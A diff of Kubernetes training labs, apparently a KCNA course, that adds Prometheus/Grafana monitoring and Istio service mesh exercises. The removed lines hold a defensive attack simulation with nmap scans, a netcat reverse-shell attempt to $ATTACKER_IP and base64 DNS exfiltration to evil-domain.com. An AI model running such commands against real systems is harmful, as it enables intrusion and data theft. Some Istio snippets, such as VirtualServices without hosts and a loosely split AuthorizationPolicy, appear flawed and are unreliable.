+    Lateral movement within the cluster through network segmentation
+    Vulnerable dependencies in container images
+    Resource exhaustion attacks through proper quotas and limits
+    Unauthorized access through proper RBAC implementation
+
+These skills are fundamental for the Kubernetes and Cloud Native Associate (KCNA) certification and are critical for anyone working with Kubernetes in production environments. The security practices you've learned today form the foundation of a comprehensive Kubernetes security strategy that protects both your applications and your infrastructure.
+
+Remember to regularly update your security policies, scan images for new vulnerabilities, and review access controls as your applications and teams evolve. Security is an ongoing process, not a one-time configuration.
+
+
+
+Lab 18: Observability with Prometheus and Grafana
+Objectives
+
+By the end of this lab, you will be able to:
+
+• Deploy Prometheus monitoring system to a Kubernetes cluster • Configure Prometheus to scrape metrics from cluster components • Install and configure Grafana for data visualization • Create custom dashboards in Grafana to monitor cluster health • Set up alerting rules for critical metrics like CPU and memory usage • Understand the fundamentals of observability in cloud-native environments • Implement monitoring best practices for Kubernetes workloads
+Prerequisites
+
+Before starting this lab, you should have:
+
+• Basic understanding of Kubernetes concepts (pods, services, deployments) • Familiarity with YAML configuration files • Basic knowledge of Linux command line operations • Understanding of containerization concepts • Access to kubectl command-line tool • Basic understanding of monitoring and metrics concepts
+Lab Environment Setup
+
+Ready-to-Use Cloud Machines: Al Nafi provides Linux-based cloud machines with all necessary tools pre-installed. Simply click Start Lab to begin - no need to build your own VM or install additional software.
+
+Your lab environment includes: • Ubuntu 20.04 LTS with Docker pre-installed • Kubernetes cluster (minikube) ready to use • kubectl configured and ready • Helm package manager installed • All necessary networking configured
+Task 1: Deploy Prometheus to the Cluster
+Subtask 1.1: Verify Cluster Status
+
+First, let's ensure our Kubernetes cluster is running properly.
+
+# Check cluster status
+kubectl cluster-info
+
+# Verify nodes are ready
+kubectl get nodes
+
+# Check if minikube is running (if using minikube)
+minikube status
+
+Subtask 1.2: Create Monitoring Namespace
+
+Create a dedicated namespace for our monitoring stack.
+
+# Create monitoring namespace
+kubectl create namespace monitoring
+
+# Verify namespace creation
+kubectl get namespaces
+
+Subtask 1.3: Deploy Prometheus Using Helm
+
+We'll use Helm to deploy Prometheus, which simplifies the installation process.
+
+# Add Prometheus community Helm repository
+helm repo add prometheus-community https://prometheus-community.github.io/helm-charts
+
+# Update Helm repositories
+helm repo update
+
+# Install Prometheus stack (includes Prometheus, Grafana, and AlertManager)
+helm install prometheus prometheus-community/kube-prometheus-stack \
+  --namespace monitoring \
+  --set prometheus.prometheusSpec.serviceMonitorSelectorNilUsesHelmValues=false \
+  --set prometheus.prometheusSpec.podMonitorSelectorNilUsesHelmValues=false
+
+Subtask 1.4: Verify Prometheus Deployment
+
+Check that all components are deployed successfully.
+
+# Check all pods in monitoring namespace
+kubectl get pods -n monitoring
+
+# Check services
+kubectl get services -n monitoring
+
+# Wait for all pods to be ready (this may take 2-3 minutes)
+kubectl wait --for=condition=ready pod -l app.kubernetes.io/name=prometheus -n monitoring --timeout=300s
+
+Subtask 1.5: Access Prometheus Web Interface
+
+Set up port forwarding to access Prometheus web interface.
+
+# Port forward Prometheus service
+kubectl port-forward -n monitoring svc/prometheus-kube-prometheus-prometheus 9090:9090 &
+
+# Note: The & runs the command in background
+# You can now access Prometheus at http://localhost:9090
+
+Open a web browser and navigate to http://localhost:9090 to verify Prometheus is running.
+Task 2: Configure Prometheus to Scrape Metrics
+Subtask 2.1: Understand Default Configuration
+
+Prometheus is already configured to scrape basic Kubernetes metrics. Let's examine the configuration.
+
+# View Prometheus configuration
+kubectl get configmap -n monitoring prometheus-kube-prometheus-prometheus-rulefiles-0 -o yaml
+
+Subtask 2.2: Deploy Sample Application for Monitoring
+
+Let's deploy a sample application that exposes metrics.
+
+# Create a sample application deployment
+cat << EOF | kubectl apply -f -
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: sample-app
+  namespace: default
+  labels:
+    app: sample-app
+spec:
+  replicas: 2
+  selector:
+    matchLabels:
+      app: sample-app
+  template:
+    metadata:
+      labels:
+        app: sample-app
+      annotations:
+        prometheus.io/scrape: "true"
+        prometheus.io/port: "8080"
+        prometheus.io/path: "/metrics"
+    spec:
+      containers:
+      - name: sample-app
+        image: prom/node-exporter:latest
+        ports:
+        - containerPort: 9100
+          name: metrics
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: sample-app-service
+  namespace: default
+  labels:
+    app: sample-app
+spec:
+  selector:
+    app: sample-app
+  ports:
+  - port: 9100
+    targetPort: 9100
+    name: metrics
+EOF
+
+Subtask 2.3: Create ServiceMonitor for Custom Application
+
+Create a ServiceMonitor to tell Prometheus to scrape our sample application.
+
+# Create ServiceMonitor
+cat << EOF | kubectl apply -f -
+apiVersion: monitoring.coreos.com/v1
+kind: ServiceMonitor
+metadata:
+  name: sample-app-monitor
   namespace: monitoring
+  labels:
+    app: sample-app
 spec:
-  hostNetwork: true
-  containers:
-  - name: monitor
-    image: nicolaka/netshoot
-    command: ["/bin/bash"]
-    args: ["-c", "sleep 3600"]
-    securityContext:
-      privileged: true
-      capabilities:
-        add: ["NET_ADMIN", "NET_RAW"]
-  nodeSelector:
-    kubernetes.io/os: linux
+  selector:
+    matchLabels:
+      app: sample-app
+  namespaceSelector:
+    matchNames:
+    - default
+  endpoints:
+  - port: metrics
+    interval: 30s
+    path: /metrics
 EOF
 
-# Wait for pod to be ready
-kubectl wait --for=condition=Ready pod/network-monitor -n monitoring --timeout=60s
+Subtask 2.4: Verify Metrics Collection
 
-# Start packet capture in background
-kubectl exec -n monitoring network-monitor -- tcpdump -i any -w /tmp/network-capture.pcap &
+Check that Prometheus is collecting metrics from our application.
 
-# Monitor network connections in real-time
-kubectl exec -n monitoring network-monitor -- netstat -tuln
+# Check if ServiceMonitor is created
+kubectl get servicemonitor -n monitoring
 
-Subtask 2.4: Analyze Network Traffic Patterns
+# Verify targets in Prometheus web interface
+# Go to http://localhost:9090/targets to see all monitored targets
 
-Use various tools to analyze the captured network traffic and identify patterns.
+Task 3: Install and Configure Grafana
+Subtask 3.1: Access Grafana
 
-# View active connections
-kubectl exec -n monitoring network-monitor -- ss -tuln
+Grafana was installed as part of the Prometheus stack. Let's access it.
 
-# Monitor network statistics
-kubectl exec -n monitoring network-monitor -- cat /proc/net/dev
+# Get Grafana admin password
+kubectl get secret -n monitoring prometheus-grafana -o jsonpath="{.data.admin-password}" | base64 --decode
+echo
 
-# Check for suspicious processes with network connections
-kubectl exec -n monitoring network-monitor -- lsof -i
+# Port forward Grafana service
+kubectl port-forward -n monitoring svc/prometheus-grafana 3000:80 &
 
-# Analyze captured packets (after some traffic generation)
-kubectl exec -n monitoring network-monitor -- tcpdump -r /tmp/network-capture.pcap -n | head -20
+Subtask 3.2: Login to Grafana
 
-Task 3: Simulate Network Attacks and Validate Policy Effectiveness
-Subtask 3.1: Deploy Attack Simulation Tools
+    Open web browser and go to http://localhost:3000
+    Login with:
+        Username: admin
+        Password: (use the password from previous step)
 
-Create pods that will simulate various types of network attacks to test our security policies.
+Subtask 3.3: Verify Prometheus Data Source
 
-# Create attacker namespace
-kubectl create namespace attacker
-kubectl label namespace attacker tier=attacker
+Grafana should already be configured with Prometheus as a data source.
 
-# Deploy attacker pod with penetration testing tools
+    In Grafana, go to Configuration → Data Sources
+    Verify that Prometheus is listed and connected
+    The URL should be: http://prometheus-kube-prometheus-prometheus:9090
+
+Task 4: Create Custom Dashboards in Grafana
+Subtask 4.1: Import Pre-built Kubernetes Dashboard
+
+Let's import a comprehensive Kubernetes dashboard.
+
+    In Grafana, click the + icon → Import
+    Enter dashboard ID: 315 (Kubernetes cluster monitoring dashboard)
+    Click Load
+    Select Prometheus as the data source
+    Click Import
+
+Subtask 4.2: Create Custom Dashboard for Node Metrics
+
+Create a custom dashboard to monitor node-specific metrics.
+
+    Click + → Dashboard → Add new panel
+
+    Configure the first panel:
+        Title: CPU Usage by Node
+        Query: 100 - (avg by (instance) (rate(node_cpu_seconds_total{mode="idle"}[5m])) * 100)
+        Visualization: Time series
+        Click Apply
+
+    Add another panel:
+        Title: Memory Usage by Node
+        Query: (1 - (node_memory_MemAvailable_bytes / node_memory_MemTotal_bytes)) * 100
+        Visualization: Stat
+        Unit: Percent (0-100)
+        Click Apply
+
+    Add third panel:
+        Title: Disk Usage
+        Query: 100 - ((node_filesystem_avail_bytes{mountpoint="/"} / node_filesystem_size_bytes{mountpoint="/"}) * 100)
+        Visualization: Gauge
+        Unit: Percent (0-100)
+        Click Apply
+
+    Save the dashboard:
+        Click Save (disk icon)
+        Name: Custom Node Monitoring
+        Click Save
+
+Subtask 4.3: Create Pod Monitoring Dashboard
+
+Create a dashboard specifically for pod metrics.
+
+    Create new dashboard: + → Dashboard
+
+    Add panel for Pod CPU Usage:
+        Title: Pod CPU Usage
+        Query: sum(rate(container_cpu_usage_seconds_total{container!="POD",container!=""}[5m])) by (pod)
+        Visualization: Time series
+
+    Add panel for Pod Memory Usage:
+        Title: Pod Memory Usage
+        Query: sum(container_memory_working_set_bytes{container!="POD",container!=""}) by (pod)
+        Visualization: Time series
+        Unit: Bytes
+
+    Add panel for Pod Count:
+        Title: Running Pods
+        Query: count(kube_pod_info)
+        Visualization: Stat
+
+    Save dashboard as Pod Monitoring
+
+Task 5: Set Up Alerts for Critical Metrics
+Subtask 5.1: Create CPU Usage Alert Rule
+
+Create an alert rule for high CPU usage.
+
+# Create PrometheusRule for CPU alerts
+cat << EOF | kubectl apply -f -
+apiVersion: monitoring.coreos.com/v1
+kind: PrometheusRule
+metadata:
+  name: cpu-usage-alerts
+  namespace: monitoring
+  labels:
+    prometheus: kube-prometheus
+    role: alert-rules
+spec:
+  groups:
+  - name: cpu.rules
+    rules:
+    - alert: HighCPUUsage
+      expr: 100 - (avg by (instance) (rate(node_cpu_seconds_total{mode="idle"}[5m])) * 100) > 80
+      for: 2m
+      labels:
+        severity: warning
+      annotations:
+        summary: "High CPU usage detected"
+        description: "CPU usage is above 80% for more than 2 minutes on {{ \$labels.instance }}"
+    
+    - alert: CriticalCPUUsage
+      expr: 100 - (avg by (instance) (rate(node_cpu_seconds_total{mode="idle"}[5m])) * 100) > 95
+      for: 1m
+      labels:
+        severity: critical
+      annotations:
+        summary: "Critical CPU usage detected"
+        description: "CPU usage is above 95% for more than 1 minute on {{ \$labels.instance }}"
+EOF
+
+Subtask 5.2: Create Memory Usage Alert Rule
+
+Create alert rules for memory usage.
+
+# Create PrometheusRule for Memory alerts
+cat << EOF | kubectl apply -f -
+apiVersion: monitoring.coreos.com/v1
+kind: PrometheusRule
+metadata:
+  name: memory-usage-alerts
+  namespace: monitoring
+  labels:
+    prometheus: kube-prometheus
+    role: alert-rules
+spec:
+  groups:
+  - name: memory.rules
+    rules:
+    - alert: HighMemoryUsage
+      expr: (1 - (node_memory_MemAvailable_bytes / node_memory_MemTotal_bytes)) * 100 > 85
+      for: 2m
+      labels:
+        severity: warning
+      annotations:
+        summary: "High memory usage detected"
+        description: "Memory usage is above 85% for more than 2 minutes on {{ \$labels.instance }}"
+    
+    - alert: CriticalMemoryUsage
+      expr: (1 - (node_memory_MemAvailable_bytes / node_memory_MemTotal_bytes)) * 100 > 95
+      for: 1m
+      labels:
+        severity: critical
+      annotations:
+        summary: "Critical memory usage detected"
+        description: "Memory usage is above 95% for more than 1 minute on {{ \$labels.instance }}"
+EOF
+
+Subtask 5.3: Create Pod-specific Alert Rules
+
+Create alerts for pod-related issues.
+
+# Create PrometheusRule for Pod alerts
+cat << EOF | kubectl apply -f -
+apiVersion: monitoring.coreos.com/v1
+kind: PrometheusRule
+metadata:
+  name: pod-alerts
+  namespace: monitoring
+  labels:
+    prometheus: kube-prometheus
+    role: alert-rules
+spec:
+  groups:
+  - name: pod.rules
+    rules:
+    - alert: PodCrashLooping
+      expr: rate(kube_pod_container_status_restarts_total[15m]) > 0
+      for: 5m
+      labels:
+        severity: warning
+      annotations:
+        summary: "Pod is crash looping"
+        description: "Pod {{ \$labels.pod }} in namespace {{ \$labels.namespace }} is restarting frequently"
+    
+    - alert: PodNotReady
+      expr: kube_pod_status_ready{condition="false"} == 1
+      for: 5m
+      labels:
+        severity: warning
+      annotations:
+        summary: "Pod not ready"
+        description: "Pod {{ \$labels.pod }} in namespace {{ \$labels.namespace }} has been not ready for more than 5 minutes"
+EOF
+
+Subtask 5.4: Verify Alert Rules
+
+Check that alert rules are loaded correctly.
+
+# Verify PrometheusRules are created
+kubectl get prometheusrules -n monitoring
+
+# Check Prometheus web interface for alerts
+# Go to http://localhost:9090/alerts to see all configured alerts
+
+Subtask 5.5: Configure Grafana Alerting
+
+Set up alerting in Grafana for dashboard panels.
+
+    In Grafana, go to your Custom Node Monitoring dashboard
+    Edit the CPU Usage by Node panel
+    Go to Alert tab
+    Click Create Alert
+    Configure alert condition:
+        Query: A (use existing query)
+        Condition: IS ABOVE 80
+        Evaluation: Every 10s for 1m
+    Add notification:
+        Name: High CPU Alert
+        Message: CPU usage is critically high
+    Click Save
+
+Subtask 5.6: Test Alert Functionality
+
+Create a high CPU load to test our alerts.
+
+# Deploy a CPU stress test pod
 cat << EOF | kubectl apply -f -
 apiVersion: v1
 kind: Pod
 metadata:
-  name: attacker-pod
-  namespace: attacker
+  name: cpu-stress-test
+  namespace: default
 spec:
   containers:
-  - name: attacker
-    image: kalilinux/kali-rolling
-    command: ["/bin/bash"]
-    args: ["-c", "apt-get update && apt-get install -y nmap netcat-traditional curl && sleep 3600"]
-    securityContext:
-      capabilities:
-        add: ["NET_RAW", "NET_ADMIN"]
-  restartPolicy: Never
+  - name: stress
+    image: progrium/stress
+    command: ["stress"]
+    args: ["--cpu", "2", "--timeout", "300s"]
+    resources:
+      requests:
+        cpu: 100m
+        memory: 128Mi
+      limits:
+        cpu: 200m
+        memory: 256Mi
 EOF
 
-# Wait for attacker pod to be ready
-kubectl wait --for=condition=Ready pod/attacker-pod -n attacker --timeout=120s
+Monitor the alerts in both Prometheus (http://localhost:9090/alerts) and Grafana to see if they trigger.
+Task 6: Advanced Monitoring Configuration
+Subtask 6.1: Configure Custom Metrics Collection
 
-Subtask 3.2: Simulate Port Scanning Attack
+Create a custom application that exposes business metrics.
 
-Test how well our network policies protect against reconnaissance attacks.
+# Deploy a sample application with custom metrics
+cat << EOF | kubectl apply -f -
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: custom-metrics-app
+  namespace: default
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: custom-metrics-app
+  template:
+    metadata:
+      labels:
+        app: custom-metrics-app
+    spec:
+      containers:
+      - name: metrics-app
+        image: nginx:alpine
+        ports:
+        - containerPort: 80
+        - containerPort: 9113
+          name: metrics
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: custom-metrics-service
+  namespace: default
+  labels:
+    app: custom-metrics-app
+spec:
+  selector:
+    app: custom-metrics-app
+  ports:
+  - port: 80
+    name: http
+  - port: 9113
+    name: metrics
+EOF
 
-# Get target IPs
-BACKEND_IP=$(kubectl get service backend-service -n backend -o jsonpath='{.spec.clusterIP}')
-DATABASE_IP=$(kubectl get service database-service -n database -o jsonpath='{.spec.clusterIP}')
+Subtask 6.2: Create ServiceMonitor for Custom Metrics
 
-echo "Backend IP: $BACKEND_IP"
-echo "Database IP: $DATABASE_IP"
+# Create ServiceMonitor for custom application
+cat << EOF | kubectl apply -f -
+apiVersion: monitoring.coreos.com/v1
+kind: ServiceMonitor
+metadata:
+  name: custom-metrics-monitor
+  namespace: monitoring
+  labels:
+    app: custom-metrics-app
+spec:
+  selector:
+    matchLabels:
+      app: custom-metrics-app
+  namespaceSelector:
+    matchNames:
+    - default
+  endpoints:
+  - port: metrics
+    interval: 15s
+    path: /metrics
+EOF
 
-# Simulate port scanning from attacker pod
-echo "Performing port scan on backend service..."
-kubectl exec -n attacker attacker-pod -- nmap -p 1-1000 $BACKEND_IP
+Troubleshooting Common Issues
+Issue 1: Pods Not Starting
 
-echo "Performing port scan on database service..."
-kubectl exec -n attacker attacker-pod -- nmap -p 1-5000 $DATABASE_IP
+If pods are not starting properly:
 
-Subtask 3.3: Simulate Lateral Movement Attack
+# Check pod status and events
+kubectl describe pod -n monitoring
 
-Test attempts to move laterally between different tiers of the application.
+# Check logs
+kubectl logs -n monitoring -l app.kubernetes.io/name=prometheus
 
-# Attempt direct connection to database from attacker namespace
-echo "Attempting direct database connection from attacker..."
-kubectl exec -n attacker attacker-pod -- nc -zv $DATABASE_IP 3306 || echo "Connection blocked by network policy"
+# Verify resource availability
+kubectl top nodes
+kubectl top pods -n monitoring
 
-# Attempt to connect to backend from attacker
-echo "Attempting backend connection from attacker..."
-kubectl exec -n attacker attacker-pod -- curl -s --connect-timeout 5 http://$BACKEND_IP || echo "Connection blocked or timed out"
+Issue 2: Metrics Not Appearing
 
-# Try to establish reverse shell (should be blocked)
-echo "Attempting reverse shell connection..."
-kubectl exec -n attacker attacker-pod -- nc -l -p 4444 &
-sleep 2
-kubectl exec -n backend $BACKEND_POD -- nc $ATTACKER_IP 4444 || echo "Reverse shell blocked"
+If metrics are not showing up in Prometheus:
 
-Subtask 3.4: Test DNS Exfiltration Prevention
+# Verify ServiceMonitor configuration
+kubectl get servicemonitor -n monitoring -o yaml
 
-Simulate DNS-based data exfiltration attempts and verify they are properly monitored.
+# Check Prometheus targets
+# Go to http://localhost:9090/targets
 
-# Attempt DNS queries to suspicious domains
-echo "Testing DNS exfiltration detection..."
-kubectl exec -n attacker attacker-pod -- nslookup malicious-domain.evil.com || echo "DNS query blocked or failed"
+# Verify service endpoints
+kubectl get endpoints -n default
 
-# Generate suspicious DNS traffic
-kubectl exec -n attacker attacker-pod -- dig @8.8.8.8 $(echo "sensitive-data-12345" | base64).evil-domain.com || echo "Suspicious DNS query detected"
+Issue 3: Grafana Connection Issues
 
-Subtask 3.5: Validate Policy Effectiveness
+If Grafana cannot connect to Prometheus:
 
-Review the effectiveness of our security policies by analyzing the attack results.
+# Check Grafana logs
+kubectl logs -n monitoring -l app.kubernetes.io/name=grafana
 
-# Check Falco alerts for detected attacks
-kubectl logs -n falco-system -l app.kubernetes.io/name=falco --tail=50
+# Verify Prometheus service
+kubectl get svc -n monitoring prometheus-kube-prometheus-prometheus
 
-# Review network policy events
-kubectl get events --all-namespaces --field-selector reason=NetworkPolicyViolation
+# Test connectivity from Grafana pod
+kubectl exec -n monitoring -it deployment/prometheus-grafana -- wget -qO- http://prometheus-kube-prometheus-prometheus:9090/api/v1/status/config
 
-# Check for any policy violations in logs
-kubectl logs -n kube-system -l component=kube-proxy --tail=20
+Cleanup
 
-# Generate summary report
-echo "=== Security Policy Validation Summary ==="
-echo "1. Port scanning attempts: $(kubectl logs -n falco-system -l app.kubernetes.io/name=falco | grep -c "Suspicious network connection" || echo "0")"
-echo "2. Network policy violations: $(kubectl get events --all-namespaces --field-selector reason=NetworkPolicyViolation --no-headers | wc -l)"
-echo "3. Blocked connections: Verified through manual testing"
+When you're finished with the lab, clean up the resources:
+
+# Stop port forwarding processes
+pkill -f "kubectl port-forward"
+
+# Delete test applications
+kubectl delete pod cpu-stress-test
+kubectl delete deployment sample-app custom-metrics-app
+kubectl delete service sample-app-service custom-metrics-service
+
+# Delete ServiceMonitors
+kubectl delete servicemonitor -n monitoring sample-app-monitor custom-metrics-monitor
+
+# Delete PrometheusRules
+kubectl delete prometheusrules -n monitoring cpu-usage-alerts memory-usage-alerts pod-alerts
+
+# Uninstall Prometheus stack (optional)
+helm uninstall prometheus -n monitoring
+
+# Delete monitoring namespace (optional)
+kubectl delete namespace monitoring
+
+Conclusion
+
+Congratulations! You have successfully completed Lab 18: Observability with Prometheus and Grafana. In this comprehensive lab, you have accomplished the following:
+
+Key Achievements:
+
+• Deployed a complete monitoring stack using Prometheus and Grafana in a Kubernetes environment • Configured metric collection from both system components and custom applications • Created custom dashboards in Grafana to visualize cluster health and performance metrics • Implemented alerting rules for critical metrics including CPU usage, memory consumption, and pod health • Set up automated monitoring for Kubernetes workloads using ServiceMonitors • Learned troubleshooting techniques for common monitoring issues
+
+Why This Matters:
+
+Observability is crucial in modern cloud-native environments because it provides the visibility needed to:
+
+    Maintain system reliability by detecting issues before they impact users
+    Optimize resource utilization and reduce costs through data-driven decisions
+    Meet SLA requirements by monitoring performance metrics continuously
+    Enable proactive maintenance through predictive alerting
+    Support incident response with detailed metrics and historical data
+
+Real-World Applications:
+
+The skills you've developed in this lab are directly applicable to:
+
+    Production Kubernetes clusters in enterprise environments
+    DevOps practices for continuous monitoring and improvement
+    Site Reliability Engineering (SRE) responsibilities
+    Cloud-native application development with built-in observability
+    Compliance and audit requirements for system monitoring
+
+Next Steps:
+
+To further enhance your observability skills, consider exploring:
+
+    Advanced Prometheus query language (PromQL) for complex metrics analysis
+    Integration with external alerting systems like PagerDuty or Slack
+    Log aggregation with tools like Fluentd and Elasticsearch
+    Distributed tracing with Jaeger or Zipkin
+    Custom metric exporters for specific applications
+
+This lab has provided you with a solid foundation in Kubernetes observability that will serve you well in your cloud-native journey and preparation for the Kubernetes and Cloud Native Associate (KCNA) certification.
+
+
+
+
+Lab 19: Configuring and Using Service Mesh
+Objectives
+
+By the end of this lab, you will be able to:
+
+• Deploy and configure Istio service mesh on a Kubernetes cluster • Understand service mesh architecture and components • Configure traffic routing and load balancing between microservices • Implement mutual TLS (mTLS) for secure service-to-service communication • Monitor and observe service mesh traffic using built-in tools • Apply traffic management policies including circuit breakers and retries
+Prerequisites
+
+Before starting this lab, you should have:
+
+• Basic understanding of Kubernetes concepts (Pods, Services, Deployments) • Familiarity with kubectl command-line tool • Knowledge of YAML configuration files • Understanding of microservices architecture • Basic networking concepts (HTTP, TLS, load balancing)
+Lab Environment
+
+Ready-to-Use Cloud Machines: Al Nafi provides Linux-based cloud machines with Kubernetes pre-installed. Simply click Start Lab to begin - no need to build your own VM or install additional software.
+
+Your lab environment includes:
+
+    Ubuntu 22.04 LTS with kubectl configured
+    Kubernetes cluster (single-node for lab purposes)
+    Internet connectivity for downloading Istio
+    All necessary permissions configured
+
+Task 1: Deploy Istio Service Mesh
+Subtask 1.1: Download and Install Istio
+
+First, we'll download and install Istio, one of the most popular service mesh solutions.
+
+    Download Istio installation script:
+
+curl -L https://istio.io/downloadIstio | sh -
+
+    Navigate to Istio directory and add istioctl to PATH:
+
+cd istio-*
+export PATH=$PWD/bin:$PATH
+
+    Verify istioctl installation:
+
+istioctl version
+
+Subtask 1.2: Install Istio on Kubernetes Cluster
+
+    Install Istio with default configuration profile:
+
+istioctl install --set values.defaultRevision=default
+
+    Verify Istio installation:
+
+kubectl get pods -n istio-system
+
+You should see pods like istiod, istio-proxy, and others running.
+
+    Enable automatic sidecar injection for default namespace:
+
+kubectl label namespace default istio-injection=enabled
+
+    Verify namespace labeling:
+
+kubectl get namespace -L istio-injection
+
+Subtask 1.3: Deploy Sample Application
+
+We'll deploy a sample bookinfo application to demonstrate service mesh capabilities.
+
+    Deploy the Bookinfo application:
+
+kubectl apply -f samples/bookinfo/platform/kube/bookinfo.yaml
+
+    Verify all services and pods are running:
+
+kubectl get services
+kubectl get pods
+
+Wait until all pods show status Running and Ready 2/2 (indicating both application and sidecar containers are running).
+
+    Create Istio Gateway and VirtualService:
+
+kubectl apply -f samples/bookinfo/networking/bookinfo-gateway.yaml
+
+    Get the external IP of Istio ingress gateway:
+
+kubectl get svc istio-ingressgateway -n istio-system
+
+Task 2: Configure Traffic Routing and Load Balancing
+Subtask 2.1: Create Multiple Versions of a Service
+
+    Deploy different versions of the reviews service:
+
+kubectl apply -f samples/bookinfo/platform/kube/bookinfo.yaml
+
+    Create destination rules for traffic management:
+
+Create a file called destination-rule.yaml:
+
+apiVersion: networking.istio.io/v1alpha3
+kind: DestinationRule
+metadata:
+  name: reviews
+spec:
+  host: reviews
+  subsets:
+  - name: v1
+    labels:
+      version: v1
+  - name: v2
+    labels:
+      version: v2
+  - name: v3
+    labels:
+      version: v3
+
+    Apply the destination rule:
+
+kubectl apply -f destination-rule.yaml
+
+Subtask 2.2: Configure Traffic Splitting
+
+    Create a VirtualService for traffic splitting:
+
+Create a file called reviews-virtual-service.yaml:
+
+apiVersion: networking.istio.io/v1alpha3
+kind: VirtualService
+metadata:
+  name: reviews
+spec:
+  http:
+  - match:
+    - headers:
+        end-user:
+          exact: jason
+    route:
+    - destination:
+        host: reviews
+        subset: v2
+  - route:
+    - destination:
+        host: reviews
+        subset: v1
+      weight: 50
+    - destination:
+        host: reviews
+        subset: v3
+      weight: 50
+
+    Apply the VirtualService:
+
+kubectl apply -f reviews-virtual-service.yaml
+
+    Test traffic routing:
+
+# Get the gateway URL
+export GATEWAY_URL=$(kubectl get svc istio-ingressgateway -n istio-system -o jsonpath='{.status.loadBalancer.ingress[0].ip}')
+
+# Test the application multiple times
+for i in {1..10}; do
+  curl -s "http://$GATEWAY_URL/productpage" | grep -o "glyphicon-star\|color:red"
+done
+
+Subtask 2.3: Implement Load Balancing Policies
+
+    Create advanced destination rule with load balancing:
+
+Create a file called advanced-destination-rule.yaml:
+
+apiVersion: networking.istio.io/v1alpha3
+kind: DestinationRule
+metadata:
+  name: reviews-lb
+spec:
+  host: reviews
+  trafficPolicy:
+    loadBalancer:
+      simple: LEAST_CONN
+    connectionPool:
+      tcp:
+        maxConnections: 10
+      http:
+        http1MaxPendingRequests: 10
+        maxRequestsPerConnection: 2
+    circuitBreaker:
+      consecutiveErrors: 3
+      interval: 30s
+      baseEjectionTime: 30s
+  subsets:
+  - name: v1
+    labels:
+      version: v1
+  - name: v2
+    labels:
+      version: v2
+  - name: v3
+    labels:
+      version: v3
+
+    Apply the advanced destination rule:
+
+kubectl apply -f advanced-destination-rule.yaml
+
+Task 3: Implement Mutual TLS (mTLS)
+Subtask 3.1: Enable Automatic mTLS
+
+    Check current mTLS status:
+
+istioctl authn tls-check productpage.default.svc.cluster.local
+
+    Create PeerAuthentication policy for strict mTLS:
+
+Create a file called peer-authentication.yaml:
+
+apiVersion: security.istio.io/v1beta1
+kind: PeerAuthentication
+metadata:
+  name: default
+  namespace: default
+spec:
+  mtls:
+    mode: STRICT
+
+    Apply the PeerAuthentication policy:
+
+kubectl apply -f peer-authentication.yaml
+
+Subtask 3.2: Verify mTLS Configuration
+
+    Check mTLS status after applying policy:
+
+istioctl authn tls-check productpage.default.svc.cluster.local
+
+    Verify mTLS is working by checking proxy configuration:
+
+istioctl proxy-config cluster productpage-v1-<pod-id>.default --fqdn reviews.default.svc.cluster.local
+
+Replace <pod-id> with actual pod ID from kubectl get pods.
+
+    Test secure communication:
+
+# Deploy a test pod without Istio sidecar
+kubectl create namespace test
+kubectl run test-pod --image=curlimages/curl -n test --rm -it --restart=Never -- sh
+
+# Try to access the service (should fail due to mTLS)
+curl http://productpage.default.svc.cluster.local:9080/productpage
+
+Subtask 3.3: Configure Authorization Policies
+
+    Create AuthorizationPolicy for service access control:
+
+Create a file called authorization-policy.yaml:
+
+apiVersion: security.istio.io/v1beta1
+kind: AuthorizationPolicy
+metadata:
+  name: productpage-viewer
+  namespace: default
+spec:
+  selector:
+    matchLabels:
+      app: productpage
+  rules:
+  - from:
+    - source:
+        principals: ["cluster.local/ns/default/sa/bookinfo-productpage"]
+  - to:
+    - operation:
+        methods: ["GET"]
+
+    Apply the authorization policy:
+
+kubectl apply -f authorization-policy.yaml
+
+Task 4: Monitor and Observe Service Mesh Traffic
+Subtask 4.1: Install Observability Add-ons
+
+    Install Kiali, Prometheus, and Grafana:
+
+kubectl apply -f samples/addons/kiali.yaml
+kubectl apply -f samples/addons/prometheus.yaml
+kubectl apply -f samples/addons/grafana.yaml
+kubectl apply -f samples/addons/jaeger.yaml
+
+    Wait for all observability pods to be ready:
+
+kubectl get pods -n istio-system
+
+Subtask 4.2: Generate Traffic and Monitor
+
+    Generate continuous traffic to the application:
+
+# Run this in a separate terminal
+while true; do
+  curl -s "http://$GATEWAY_URL/productpage" > /dev/null
+  sleep 1
+done
+
+    Access Kiali dashboard:
+
+kubectl port-forward -n istio-system svc/kiali 20001:20001
+
+Open browser and navigate to http://localhost:20001 (username: admin, password: admin)
+
+    Access Grafana dashboard:
+
+kubectl port-forward -n istio-system svc/grafana 3000:3000
+
+Open browser and navigate to http://localhost:3000
+Subtask 4.3: Analyze Service Mesh Metrics
+
+    View service topology in Kiali:
+        Navigate to Graph section
+        Select default namespace
+        Observe service communication patterns
+
+    Check Istio metrics in Grafana:
+        Go to Dashboards → Istio
+        Explore Istio Service Dashboard
+        Analyze request rates, error rates, and latencies
+
+    Use istioctl for proxy analysis:
+
+# Check proxy configuration
+istioctl proxy-config cluster productpage-v1-<pod-id>.default
+
+# Check listeners
+istioctl proxy-config listener productpage-v1-<pod-id>.default
+
+# Check routes
+istioctl proxy-config route productpage-v1-<pod-id>.default
+
+Task 5: Advanced Traffic Management
+Subtask 5.1: Implement Fault Injection
+
+    Create fault injection policy:
+
+Create a file called fault-injection.yaml:
+
+apiVersion: networking.istio.io/v1alpha3
+kind: VirtualService
+metadata:
+  name: reviews-fault
+spec:
+  http:
+  - fault:
+      delay:
+        percentage:
+          value: 50
+        fixedDelay: 5s
+      abort:
+        percentage:
+          value: 10
+        httpStatus: 500
+    match:
+    - headers:
+        end-user:
+          exact: jason
+    route:
+    - destination:
+        host: reviews
+        subset: v2
+  - route:
+    - destination:
+        host: reviews
+        subset: v1
+
+    Apply fault injection:
+
+kubectl apply -f fault-injection.yaml
+
+    Test fault injection:
+
+# Test with jason user (should experience delays and errors)
+curl -H "end-user: jason" "http://$GATEWAY_URL/productpage"
+
+Subtask 5.2: Configure Timeout and Retry Policies
+
+    Create timeout and retry configuration:
+
+Create a file called timeout-retry.yaml:
+
+apiVersion: networking.istio.io/v1alpha3
+kind: VirtualService
+metadata:
+  name: reviews-timeout
+spec:
+  http:
+  - route:
+    - destination:
+        host: reviews
+        subset: v1
+    timeout: 3s
